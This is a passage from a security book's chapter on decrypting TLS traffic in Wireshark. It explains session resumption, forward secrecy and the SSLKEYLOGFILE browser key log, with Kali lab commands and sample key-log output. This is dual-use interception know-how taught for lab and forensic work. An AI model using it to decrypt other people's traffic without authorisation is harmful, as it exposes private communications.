<div class="Section280" ><p class=MsoBodyText ><img width="780"  height="428"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker359725.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:53.7500px;width:763.0000px;height:590.0000px;" ><img width="763"  height="590"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker359728.png" ></span><a name="_bookmark548" ></a><span><a href="#_bookmark547" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Decrypting TLS traffic in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-top:9.9500pt;margin-right:114.0000pt;margin-left:20.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >TROUBLESHOOTING TLS DECRYPTION</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:19.8000pt;margin-right:20.6000pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you want to decrypt using the private RSA key, you have to catch the initial SSL/TLS handshake where the client and the server exchange keys. Where you can run into problems with this</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is with SSL/TLS resumption using the Session ID or TLS Session Resumption Tickets (</span><span><a href="https://tools.ietf.org/html/rfc5077" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >https://tools.ietf.org/html/rfc5077</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). With session resumption, the client sends a session or ticket to the server to specify which session key to use. If Wireshark is not able to capture that initial handshake and decrypt the session key, it will not be able to decrypt SSL/TLS that is resumed, because the session key is cached on either side and doesn&#8217;t cross the network again until a new session key is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >generated.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:13.3500pt;margin-left:20.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For our example, the easiest way to ensure that you are capturing the initial handshake is to restart the lab environment, which wipes the TLS servers cache so that it always generates a new session key.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;position:relative;top:0.5000pt;mso-text-raise:-0.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section281" ><p class=MsoBodyText  style="margin-left:13.4000pt;line-height:5.2500pt;mso-line-height-rule:exactly;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:762.0000px;height:9.0000px;" ><img width="762"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker360816.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Decrypting SSL/TLS Using Session Keys</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><a name="_bookmark549" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The previous section walked through how to decrypt TLS traffic using Wireshark. Unfortunately, this can&#8217;t be reproduced on the web server in the lab environment. The lab environment is actually configured to block secure TLS protocols, in particular, on the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.9500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >web server. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ftp1.labs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >server has the Diffie-Helman (DH) key exchange protocol explicitly disabled.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The DH algorithm is disabled because it actually makes decryption much trickier, because DH works very much like the asymmetric encryption we talked about earlier. The difference is that with DH, even an attacker that has captured the session key exchange and has access to the server&#8217;s private key is not able to get at the session keys. This feature, whereby even the compromise of the private key doesn&#8217;t compromise all the session key exchanges, is referred to as </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Perfect Forward Secrecy </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(PFS). The good news for anyone relying on TLS when doing shopping or banking is that DH is more and more common, and browsers, by default, try to negotiate the strongest TLS algorithms the web server supports. This is bad news, though, for attacks or network forensic people. If the client and server use DH key exchange, then compromising the server&#8217;s private key doesn&#8217;t help us.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:8.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >All is not lost, however. Just because you are not able to decrypt the session key exchange doesn&#8217;t mean you can&#8217;t get to the session keys themselves. Remember, asymmetric encryption is just used to protect the session keys in transit, and that actual application data encryption is done using the session keys. If a client and server are using DH, this means you have to find another way to get access to these session</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >keys. There are various ways to get access to session keys. They are often application specific and just require a little creativity. For us, though, we are just going to leverage built-in web browser debug functionality to demonstrate how to decrypt a TLS stream using session keys instead of the web server&#8217;s private</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >key.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When dealing with TLS, developers often need to be able to decrypt TLS streams. To this end, most web browsers support the ability to log out the session keys used for TLS encryption. You can enable this</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section282" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >functionality by creating an environment variable called </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLKEYLOGFILE</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. An environment variable is exactly what it sounds like; it is just a variable that is accessible to any application running within the operating system&#8217;s environment. Each operating system sets different environment variables, so you will need to do some research, depending on the operating system for which you want to set environment variables. For Linux, the process of setting a temporary environment variable is to open a terminal and type</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# export SSLKEYLOGFILE='/root/session.log'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After setting the environment variable, launch the browser Iceweasel, which is the Firefox equivalent on Kali.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Be sure to launch Iceweasel from the same terminal so that it picks up your newly added environment variable.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# iceweasel</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><a name="_bookmark550" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This should launch the web browser. Browse to a website secured with TLS (</span><span><a href="https://wikipedia.org/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://wikipedia.org</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is a good example). After some secure browsing, you should be able to see the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >session.log </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/root </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory. The following is the output from the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >session.log </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file after browsing to some secured sites.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# cat session.log</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ># SSL/TLS secrets log file, generated by NSS CLIENT_RANDOM</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >1688068b367700c719e838d1baf25fac55a7ef3ca05a378f8f72959 72e86d9c4af39975ee5e8d952eb586acf9a4d2b6eab8da6d1945a7289b8635ee1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8d0269a7d439770b01487b96e7bd5081f787 CLIENT_RANDOM</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >8641caefc8229bee3cb5a864805cf117cb96f40bfa33ae4e2fd9332 823bb9391d2ee10693d96a3d4c69503413fba08de3b14d079c72ab6daf33c4032</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >994a08a90affd3bea4f6728a6505fdaf1059 CLIENT_RANDOM</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >7d40e7ef3cf1a29cf888c86c4a871332fc3493bf0958a174bddb5d8 f63d491a8bf784a80dcfde1c9d4db67648e817704c8a1a5d3e3c9fce63a4f7988</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >c8b70e43b24d367250541887b419882e16fb CLIENT_RANDOM</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ea23d54e2f28fca9ddf434472a98e96124192b575c46c160dd1a72a</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section283" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >c0b99e39a0f8dbe392d65efa8e719c7bc7ed0fe33288109659a0e4d38327759fd</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >aaf03bb36d214651e38ab072f42c0dfd2a4b CLIENT_RANDOM</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >7bec7ca91a9635c34cc02caa5603a83321e0ea1e343a0256c882ffc 8b7c0dd38afd9f3a990b8f6b231c4a12787f0654bd76f7f58e637f9fbea3dc231</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2a5bd48598821b32f54af3d85e32d59628ed</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This output of session keys can now be easily parsed by Wireshark for decryption. You need to go back and edit the SSL protocol preferences by clicking Edit, then Protocols and SSL. From that window, select Browse for the (Pre)-Master-Secret log filename. Select whatever log file you set the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLKEYLOGFILE </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >environment variable to. In this case, this was the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >/root/session.log</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.2000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file (see<a name="_bookmark551" ></a>&nbsp;</span><span><a href="#_bookmark552" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-6</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="428"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker365614.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark552" ></a><span><a href="#_bookmark551" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Adding SSLKEYLOGFILE</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;" ><a name="_bookmark553" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With Wireshark configured to use the log file, you can go back to the main packet list and drill into the SSL/TLS traffic. If you right-click on an SSL/TLS packet now and select Follow SSL Stream, you can see the decrypted traffic. You may also notice an additional tab appears for Application Data SSL/TLS packets that also show you the decrypted contents. You probably noticed that the decrypted data doesn&#8217;t immediately look like HTTP traffic. The reason for this is that</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section284" ><p class=MsoBodyText  style="margin-top:3.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark is strictly decrypting the TLS traffic and is not applying any additional protocol dissector to the data (see<a name="_bookmark554" ></a>&nbsp;</span><span><a href="#_bookmark555" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="428"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker366322.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark555" ></a><span><a href="#_bookmark554" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Decrypted SSL/TLS data</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="767"  height="410"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker366391.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" 